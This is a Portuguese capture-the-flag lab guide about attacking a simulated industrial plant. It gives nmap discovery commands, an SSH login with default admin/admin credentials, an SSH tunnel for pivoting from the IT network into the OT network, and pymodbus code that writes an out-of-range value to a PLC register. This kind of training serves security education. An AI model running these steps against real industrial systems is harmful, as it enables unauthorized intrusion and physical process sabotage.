# Desafio 02 — Exploração: Credenciais Padrão e Pivoteamento

> **Contexto:** Após o primeiro incidente, a Planta "Probatio" implantou
> segmentação entre as redes de TI e de OT e um servidor de acesso remoto
> (jump host) para administração. Porém, o aparelho foi configurado com as
> **credenciais padrão de fábrica**. Sua missão é explorar essa falha para
> alcançar a rede OT e atingir o PLC.

## Objetivo

Identificar credenciais padrão no jump host, realizar o pivoteamento entre
os segmentos de rede (TI → OT) e explorar o PLC Modbus na rede industrial.

---

## Dicas

### 1. Duas redes, dois segmentos

O laboratório agora possui duas sub-redes isoladas:

| Segmento | Sub-rede         | Quem está lá                          |
|----------|------------------|---------------------------------------|
| TI       | `172.29.0.0/24`  | você (atacante), jump host            |
| OT       | `172.30.0.0/24`  | jump host, PLC (inacessível de você)  |

Mapeie a rede de TI:

```bash
nmap -sn 172.29.0.0/24
```

> **Para estudar:** [nmap — Host Discovery](https://nmap.org/book/man-host-discovery.html) · [Docker — redes](https://docs.docker.com/network/)

### 2. Enumerar o jump host

Descubra os serviços expostos no host suspeito:

```bash
nmap -sV 172.29.0.2
```

A porta **22/TCP (SSH)** deve estar aberta.

> **Para estudar:** [nmap — Service/Version Detection](https://nmap.org/book/man-version-detection.html) · [OpenSSH](https://www.openssh.com/manual.html)

### 3. Credenciais padrão de fábrica

Dispositivos industriais e de rede são frequentemente entregues com
credenciais padrão. Tente:

```bash
ssh admin@172.29.0.2
# senha: admin
```

> Neste container também há `sshpass` para testes automatizados:
> `sshpass -p admin ssh admin@172.29.0.2`

> **Para estudar:** [ssh — man page](https://man.openbsd.org/ssh) · [sshpass — man page](https://manpages.debian.org/bookworm/sshpass/sshpass.1.en.html)

### 4. Da TI para a OT (pivoteamento)

Dentro do jump host, a rede OT está acessível. Descubra o alvo:

```bash
nmap -sn 172.30.0.0/24
nmap -p 502 172.30.0.20
```

O `python3` com `pymodbus` já está instalado no jump host. Execute
diretamente lá:

```python
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient("172.30.0.20", port=502)
client.connect()
print(client.read_holding_registers(address=0, count=1, device_id=1).registers)
client.write_register(address=0, value=200, device_id=1)
client.close()
```

**Alternativa — túnel SSH (técnicas de pivoteamento):**

```bash
ssh -f -N -L 1502:172.30.0.20:502 admin@172.29.0.2
```

Depois, no seu terminal (atacante), conecte-se ao Modbus via túnel:

```python
client = ModbusTcpClient("127.0.0.1", port=1502)  # túnel local
```

> **Para estudar:** [ssh — encaminhamento local (`-L`)](https://man.openbsd.org/ssh#L) · [pymodbus](https://pymodbus.readthedocs.io/en/latest/)

### 5. Por que o alvo não é acessível diretamente?

O PLC existe apenas na sub-rede OT. O nó atacante não tem rota até
`172.30.0.0/24` — o pivoteamento através do jump host é obrigatório.

> **Para estudar:** [Docker — redes](https://docs.docker.com/network/) · [Pivoteamento e túneis com SSH (HackTricks)](https://book.hacktricks.xyz/pentesting/pivoting-ssh-tunnel)

### 6. Variável crítica

Mesma regra do Desafio 01: holding register **endereço 0**, faixa normal
**20–80**, escreva **≥ 150** para gerar a flag.

> **Para estudar:** [Especificação Modbus](https://modbus.org/specs.php)

### 7. Validação da flag

Valide no frontend: **http://localhost:8080** (Desafio 02).

---

## Referências para estudo

| Ferramenta / Tópico | Documentação |
|---------------------|--------------|
| nmap — detecção de serviços (`-sV`) | <https://nmap.org/book/man-version-detection.html> |
| OpenSSH — manual | <https://www.openssh.com/manual.html> |
| ssh — encaminhamento de portas | <https://man.openbsd.org/ssh#L> |
| sshpass — man page | <https://manpages.debian.org/bookworm/sshpass/sshpass.1.en.html> |
| Pivoteamento com SSH (HackTricks) | <https://book.hacktricks.xyz/pentesting/pivoting-ssh-tunnel> |
| pymodbus — documentação | <https://pymodbus.readthedocs.io/en/latest/> |
| Especificação Modbus | <https://modbus.org/specs.php> |
| Docker — redes | <https://docs.docker.com/network/> |
